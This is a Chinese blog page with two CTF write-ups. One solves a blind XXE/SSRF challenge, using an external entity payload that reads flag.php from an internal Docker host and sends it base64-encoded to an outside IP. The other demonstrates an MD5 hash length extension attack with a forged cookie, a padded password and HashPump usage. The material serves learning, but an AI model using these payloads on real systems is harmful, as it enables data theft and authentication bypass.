<p>base64解码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1   localhost</span><br><span class="line">::1 localhost ip6-localhost ip6-loopback</span><br><span class="line">fe00::0 ip6-localnet</span><br><span class="line">ff00::0 ip6-mcastprefix</span><br><span class="line">ff02::1 ip6-allnodes</span><br><span class="line">ff02::2 ip6-allrouters</span><br><span class="line">172.17.0.6  flag 5e8af79b12ae xxessrf_flag_1</span><br><span class="line">172.17.0.6  flag_1 5e8af79b12ae xxessrf_flag_1</span><br><span class="line">172.17.0.6  xxessrf_flag_1 5e8af79b12ae</span><br><span class="line">172.17.0.7  74791d7ac29b</span><br></pre></td></tr></table></figure></p>
<p>嗯？？？？还有一层？？？接着继续读下index<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;&lt;head&gt;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot;&gt;</span><br><span class="line">     </span><br><span class="line">    &lt;title&gt;XML&lt;/title&gt;</span><br><span class="line">    &lt;link rel=&quot;stylesheet&quot; href=&quot;./bootstrap.min.css&quot;&gt;  </span><br><span class="line">    &lt;script src=&quot;./jquery.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script src=&quot;./bootstrap.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;form role=&quot;form&quot; id=&quot;form&quot; method=&quot;POST&quot; action=&quot;index.php&quot;&gt;</span><br><span class="line">    &lt;div class=&quot;form-group&quot;&gt;</span><br><span class="line">        &lt;label for=&quot;name&quot;&gt;XML&lt;/label&gt;</span><br><span class="line">        &lt;textarea class=&quot;form-control&quot; rows=&quot;6&quot; name=&quot;data&quot; placeholder=&quot;</span><br><span class="line">&lt;code&gt;</span><br><span class="line">    &lt;body&gt;Hello World!&lt;/body&gt;</span><br><span class="line">&lt;/code&gt; </span><br><span class="line">&quot;&gt;&lt;/textarea&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">  &lt;div class=&quot;btn-group&quot;&gt;</span><br><span class="line">    &lt;button type=&quot;button&quot; class=&quot;btn btn-default&quot; onclick=&quot;document.getElementById(&apos;form&apos;).submit()&quot;&gt;SUBMIT&lt;/button&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">  &lt;?php</span><br><span class="line">    error_reporting(0);</span><br><span class="line">    include(&quot;flag.php&quot;);</span><br><span class="line">    if(isset($_POST[&apos;data&apos;]) and $_POST[&apos;data&apos;] != &quot;&quot;) &#123;</span><br><span class="line">        $xml = simplexml_load_string($_POST[&apos;data&apos;], null, LIBXML_NOENT);</span><br><span class="line">    &#125;</span><br><span class="line">    ?&gt;</span><br><span class="line">  &lt;/form&gt;</span><br></pre></td></tr></table></figure></p>
<p>哦？？圈住include(“flag.php”),尝试直接读,没反应,想着也应该,还有提示SSRF<br>至此,上午工作基本结束,剩下持续发呆直到下午……<br>xxessrf???开始探测内网端口….从8080…..到2018…..<br>嗯中途放弃了…..最后又拿了起来,在队友群又发一下hosts截图</p>
<p>你那个172.17.0.7是啥?</p>
<p>…….docker,内网<br>读取flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % payl SYSTEM &quot;php://filter/read=convert.base64-encode/resource=http://172.17.0.6/?file=php://filter/read=convert.base64-encode/resource=flag.php&quot;&gt;</span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; trick SYSTEM &apos;http://104.236.236.145/?p=%payl;&apos;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UEQ5d2FIQWdDaTh2WldOb2J5QWlZM1Z0ZEdOMFpudENNV2x1TTE5NGVETmZZVzVrWDNOemNtWmZNWE5mUTI5dmJEOTlJanNLUHo0S0NnPT0=</span><br></pre></td></tr></table></figure>
<p>…</p>
<p>&lt;?php<br>//echo “cumtctf{B1in3_xx3_and_ssrf_1s_Cool?}”;<br>?&gt;</p>

          
        
      
    </div>

    

    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://altmanz.cn/2017/12/20/hash长度扩展攻击/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Altm4nz">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Altm4nz">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/12/20/hash长度扩展攻击/" itemprop="url">
                  哈希长度拓展攻击
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">

            
            
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              

              
                
              

              <time title="Created: 2017-12-20 00:00:00" itemprop="dateCreated datePublished" datetime="2017-12-20T00:00:00+08:00">2017-12-20</time>
            

            
              

              
                
                <span class="post-meta-divider">|</span>
                

                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Edited on</span>
                
                <time title="Modified: 2018-02-03 22:48:05" itemprop="dateModified" datetime="2018-02-03T22:48:05+08:00">2018-02-03</time>
              
            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>实验吧看到的题，之前觉得很难<br>最近有空再做一次<br>记录一下学习过程</p>
<h2 id="0x01-hash函数原理"><a href="#0x01-hash函数原理" class="headerlink" title="0x01 hash函数原理"></a>0x01 hash函数原理</h2><p>网上有很多讲解，大概就是将明文分为n个区块，在进行多轮运算。大部分明文不能被区块长度整除，所以必须被padding至区块长度的整数倍。然后进行n次运算后得到密文。</p>
<h2 id="0x02-攻击方式"><a href="#0x02-攻击方式" class="headerlink" title="0x02 攻击方式"></a>0x02 攻击方式</h2><p>当key未知，key的位数已知，md5(key)已知。那么可以求出md5(key+”填充数据”+”任意数据”)。<br>通过一道实验吧的题来理解。<br>源码如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">$flag = &quot;XXXXXXXXXXXXXXXXXXXXXXX&quot;;</span><br><span class="line">$secret = &quot;XXXXXXXXXXXXXXX&quot;; // This secret is 15 characters long for security!</span><br><span class="line"></span><br><span class="line">$username = $_POST[&quot;username&quot;];</span><br><span class="line">$password = $_POST[&quot;password&quot;];</span><br><span class="line"></span><br><span class="line">if (!empty($_COOKIE[&quot;getmein&quot;])) &#123;</span><br><span class="line">    if (urldecode($username) === &quot;admin&quot; &amp;&amp; urldecode($password) != &quot;admin&quot;) &#123;</span><br><span class="line">        if ($COOKIE[&quot;getmein&quot;] === md5($secret . urldecode($username . $password))) &#123;</span><br><span class="line">            echo &quot;Congratulations! You are a registered user.\n&quot;;</span><br><span class="line">            die (&quot;The flag is &quot;. $flag);</span><br><span class="line">        &#125;</span><br><span class="line">        else &#123;</span><br><span class="line">            die (&quot;Your cookies don&apos;t match up! STOP HACKING THIS SITE.&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        die (&quot;You are not an admin! LEAVE.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">setcookie(&quot;sample-hash&quot;, md5($secret . urldecode(&quot;admin&quot; . &quot;admin&quot;)), time() + (60 * 60 * 24 * 7));</span><br><span class="line"></span><br><span class="line">if (empty($_COOKIE[&quot;source&quot;])) &#123;</span><br><span class="line">    setcookie(&quot;source&quot;, 0, time() + (60 * 60 * 24 * 7));</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">    if ($_COOKIE[&quot;source&quot;] != 0) &#123;</span><br><span class="line">        echo &quot;&quot;; // This source code is outputted here</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>要满足要求<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$COOKIE[&quot;getmein&quot;] === md5($secret . urldecode($username . $password))</span><br></pre></td></tr></table></figure></p>
<p>知道了$secret的位数，通过cookie得知md5($secret+admin)=571580b26c65f306376d4f64e53cb5c7。那么通过hash拓展攻击可以满足上面的要求。<br>首先将$secret+admin填充至512bits，然后在加上任意数据例如altman得到新的值X，这里将X进行hash运算，分为两组进行两轮运算。<br>第一组运算md5($secret+admin+填充值)，会发现他与已知md5($secret+admin)相同，那么我们直接利用md5($secret+admin)得到第一轮运算结果。<br>然后通过第一轮运算结果得到第二轮结果，这样我们就在不知道$secret值的情况下算出了md5($secret+admin+”填充值”+”任意数据”)。<br>构造<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">username=admin</span><br><span class="line">password=admin%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%c8%00%00%00%00%00%00%00altman</span><br><span class="line">cookie:getmein=10a4b3dc8626cb07d24bda61be701b9f</span><br></pre></td></tr></table></figure></p>
<p>成功绕过了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$COOKIE[&quot;getmein&quot;] === md5($secret . urldecode($username . $password))</span><br></pre></td></tr></table></figure></p>
<p>拿到flag /。</p>
<h2 id="0x03-攻击脚本"><a href="#0x03-攻击脚本" class="headerlink" title="0x03 攻击脚本"></a>0x03 攻击脚本</h2><p>github有好几个攻击脚本，但是试了试感觉都太麻烦。<br>发现github有个攻击工具很好用。<br>HashPump<br>简单说下安装(linux)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/bwall/HashPump</span><br><span class="line">apt-get install g++ libssl-dev</span><br><span class="line">cd HashPump</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure></p>
<p>用起来很简单<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># hashpump</span><br><span class="line">Input Signature: 571580b26c65f306376d4f64e53cb5c7 //(已知的hash值)</span><br><span class="line">Input Data: admin</span><br><span class="line">Input Key Length: 20 //($secret 15位+admin 5位)</span><br><span class="line">Input Data to Add: altman  //添加的任意数据</span><br></pre></td></tr></table></figure></p>
<p>然后就会得到payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">10a4b3dc8626cb07d24bda61be701b9f //md5($secret+admin+passwd)</span><br><span class="line">admin\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xc8\x00\x00\x00\x00\x00\x00\x00altman //构造的passwd</span><br></pre></td></tr></table></figure></p>
<h2 id="0x04-当无法获取密钥长度时"><a href="#0x04-当无法获取密钥长度时" class="headerlink" title="0x04 当无法获取密钥长度时"></a>0x04 当无法获取密钥长度时</h2><p>只能通过脚本爆破了，正确的长度会返回不一样的报错信息。</p>

          
        
      
    </div>

    

    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
  </section>

  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span>
  </nav>



          </div>
          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      

      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <p class="site-author-name" itemprop="name">Altm4nz</p>
              <p class="site-description motion-element" itemprop="description"></p>
          </div>

          
            <nav class="site-state motion-element">
              
                <div class="site-state-item site-state-posts">
                
                  <a href="/archives/">
                
                    <span class="site-state-item-count">18</span>
                    <span class="site-state-item-name">posts</span>
                  </a>
                </div>
              

              

              
                
                
                <div class="site-state-item site-state-tags">
                  
                    
                    
                      
                    
                    <span class="site-state-item-count">1</span>
                    <span class="site-state-item-name">tags</span>
                  
                </div>
              
            </nav>
          

          

          

          
          

          
          

          
            
          
          

        </div>
      </section>

      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
  <span class="with-love" id="animate">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Altm4nz</span>

  

  
</div>




  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> v3.7.1</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">Theme – <a class="theme-link" target="_blank" href="https://theme-next.org">NexT.Muse</a> v6.3.0</div>




        








        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    
	
    

    
  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>


























  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=6.3.0"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=6.3.0"></script>



  
  

  

  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=6.3.0"></script>



  



  










  





  

  

  

  

  
  

  

  

  

  

  

</body>
</html>
